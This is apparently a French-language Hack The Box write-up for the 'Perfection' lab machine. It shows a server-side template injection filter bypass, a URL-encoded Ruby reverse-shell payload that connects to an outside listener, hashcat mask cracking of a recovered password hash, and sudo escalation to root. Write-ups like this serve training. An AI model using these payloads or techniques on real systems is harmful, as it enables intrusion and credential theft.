---
date: 2024-07-04T14:05:10-05:00
# description: ""
image: "/images/HTB-Perfection/Perfection.png"
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "HTB: Perfection"
type: "post"
---

* Platforme: Hack The Box
* Lien: [Perfection](https://app.hackthebox.com/machines/Perfection)
* Niveau: Facile
* OS: Linux
---

Ce challenge débute avec un site web simple. Grâce à l'énumération, nous identifions une vulnérabilité à l'injection de modèle côté serveur (SSTI), que nous exploitons pour obtenir notre accès initial. Nous découvrons ensuite un fichier de base de données contenant des hachages de mots de passe, mais nos premières tentatives pour les craquer sont infructueuses. Après avoir lu les courriels des utilisateurs, nous apprenons que les mots de passe suivent un format spécifique. En utilisant cette information, nous employons une attaque par masque avec Hashcat et réussissons à récupérer le mot de passe. Enfin, nous exécutons `sudo -l` et découvrons des règles très permissives, nous permettant d'élever nos privilèges sans avoir besoin d'un mot de passe.

Addresse IP cible - `10.10.11.253`

## Balayage

```
nmap -sC -sV -oA  nmap/Perfection 10.10.11.253
```

**Résultats**

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-25 14:20 CDT
Nmap scan report for 10.10.11.253
Host is up (0.051s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA)
|_  256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519)
80/tcp open  http    nginx
|_http-title: Weighted Grade Calculator
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.06 seconds
```

## Enumération

Le site web offre un "outil permettant de calculer des notes sur la base des données entrées.

`http://10.10.11.253/weighted-grade-calc` nous permet d'utiliser l'outil.

![Calculate your weighted grade table](/images/HTB-Perfection/weighed-grade.png)

Après avoir rempli le tableau et soumis les notes, nous obtenons des résultats.

![Weighted grades](/images/HTB-Perfection/weighed-grade-results.png)

En bas de page, nous lisons que l'application utilise `WEBrick 1.7.0`. 

![Website powered by WEBrick 1.7.0](/images/HTB-Perfection/WEBrick.png)

La recherche de vulnérabilités associées à cette version spécifique ne donne aucun résultat. L'énumération des sous-domaines et du code source aboutit au même résultat.

L'extension `Wappalyzer` révèle que l'application utilise `Ruby 3.0.2`.

![Wapplyzer results](/images/HTB-Perfection/wappalyzer.png)

Puisque l'application accepte les entrées de l'utilisateur, nous pouvons essayer quelques attaques par injection. Nous remplissons le tableau, capturons la requête avec Burp Suite et l'envoyons au repeater.

Le premier test est avec ` ; ls` comme valeur pour `category1`.

![Request in Burp for injection attack](/images/HTB-Perfection/injection-attack.png)

Il renvoie `Malicious input blocked` (entrée malveillante bloquée). Les essais avec différents payloads aboutissent au même résultat, il y a donc un filtre de données qu'il faut contourner.

![Injection blocked](/images/HTB-Perfection/injection-blocked.png)

Sur la page github de `WEBrick`, nous apprenons qu'il peut être utilisé à différentes fins. *Plus d'informations, [ici](https://github.com/ruby/webrick).*

![WEBrick github page](/images/HTB-Perfection/WEBrick-github.png)

Nous apprenons également qu'ERB est un système de templates pour Ruby. *Plus d'informations, [ici](https://github.com/ruby/erb).*

![ERB-template page](/images/HTB-Perfection/ERB-template.png)

N'étant pas familier avec ces technologies, nous nous faisons aider par ChatGPT sur comment vérifier si un serveur utilise le système de templating Ruby ERB. Nous utiliserons la troisième option.

![ERB tests](/images/HTB-Perfection/ERB-test.png)

## Accès Initial

En utilisant la payload indiqué, j'obtiens le message suivant:

`Invalid query parameters: invalid %-encoding (&amp;lt;%= 2 + 2 %&amp;gt;)`.

Après quelques modifications, il marche avec succès! Le filtre peut être contourné en utilisant `%0A` (pour une nouvelle ligne) et l'encodage d'URL.

> Payload utilisé pour le test: `%0A<%25%3d+2+%2b+2+%25>`

![Successful SSTI test](/images/HTB-Perfection/SSTI-working.png)

Ce résultat confirme que la cible est vulnérable au [SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#erb-ruby) et qu'elle utilise effectivement Ruby ERB. Nous pouvons exécuter un reverse shell et accéder au système.

Ci-dessous, le payload (ruby) utilisé pour obtenir un reverse shell, il provient de [revshells](https://www.revshells.com/).

```
Chemistry%0A<%25%3d+`ruby+-rsocket+-e'spawn("sh",[%3ain,%3aout,%3aerr]%3d>TCPSocket.new("10.10.15.4",1337))'`+%25>
```

![Ruby reverse shell](/images/HTB-Perfection/ruby-revshell.png)

Nous obtenons une connexion sur notre listener et sommes connectés en tant qu'utilisateur `susan`. Nous améliorons notre shell avec les commandes ci-dessous.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'  
export TERM=xterm  
ctrl + z  
stty raw -echo; fg
stty rows 38 columns 116
```

![Foothold](/images/HTB-Perfection/foothold.png)

Le fichier `user.txt` se trouve dans `/home/susan`.

![User flag location](/images/HTB-Perfection/user-flag.png)

## Elévation de Privilèges

Nous utilisons `linpeas.sh` pour trouver des pistes d'escalade de privilèges.

* `susan` fait partie du groupe sudo

![User susan is a sudoer](/images/HTB-Perfection/susan-sudoer.png)

* Des fichiers contenant des informations d'identification sont trouvés

![Credentials files are found](/images/HTB-Perfection/susan-credentials.png)

* L'utilisateur a également reçu du courrier, qui peut être intéressant à consulter

![The user has some mail](/images/HTB-Perfection/susan-mail.png)


Il s'avère que nous ne pouvons pas exécuter `sudo -l` sans mot de passe.

![sudo -l requires password](/images/HTB-Perfection/susan-privesc.png)

Le fichier de base de données contient des hashs d'utilisateurs dont celui de `susan`.

```
strings /home/susan/Migration/pupilpath_credentials.db
```

![susan hash](/images/HTB-Perfection/susan-hash.png)

```
hashid 'abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f'
```

`hashid` révèle qu'il s'agit d'un hash SHA-256. Nous essayons d'utiliser hashcat avec le hachage mais cela échoue.

Après avoir lu le courrier, nous découvrons que le mot de passe utilise une structure spécifique.

![Reading susan mail](/images/HTB-Perfection/susan-mail1.png)

Nous tentons une attaque par masque et réussissons à récupérer le mot de passe `susan_nasus_413759210`.

> Dans une attaque par masque, nous avons connaissance des designs des mots de passe. Vous pouvez en lire plus à ce sujet [ici](https://hashcat.net/wiki/doku.php?id=mask_attack#mask_attack).

```
hashcat -m 1400 hash.txt -a 3 -d 1 susan_nasus_?d?d?d?d?d?d?d?d?d
```

![Reading susan mail](/images/HTB-Perfection/password-recovered.png)

Avec ce mot de passe, nous nous connectons via SSH. Avec `sudo -l` nous constatons que nous avons un accès direct à root.

![sudo -l command](/images/HTB-Perfection/sudo-l.png)

La règle mise en place est très permissive, permettant à l'utilisateur `susan` d'exécuter n'importe quelle commande, en tant que n'importe quel utilisateur ou groupe, ce qui lui donne un contrôle administratif complet lorsque l'on utilise `sudo`. 

En exécutant `sudo su`, nous obtenons un shell root et trouvons le drapeau root dans `/root`.

![root flag](/images/HTB-Perfection/root-flag.png)

Merci d'avoir lu mon blog et j'espère que cet article vous a été utile! Si vous voulez vous exercer au SSTI, jetez un coup d'œil à ces machines sur HackTheBox :
* [RedPanda](https://app.hackthebox.com/machines/RedPanda/information) (Facile)
* [Sandworm](https://app.hackthebox.com/machines/Sandworm/information) (Moyen)
* [Talkative](https://app.hackthebox.com/machines/Talkative/information) (Difficile)
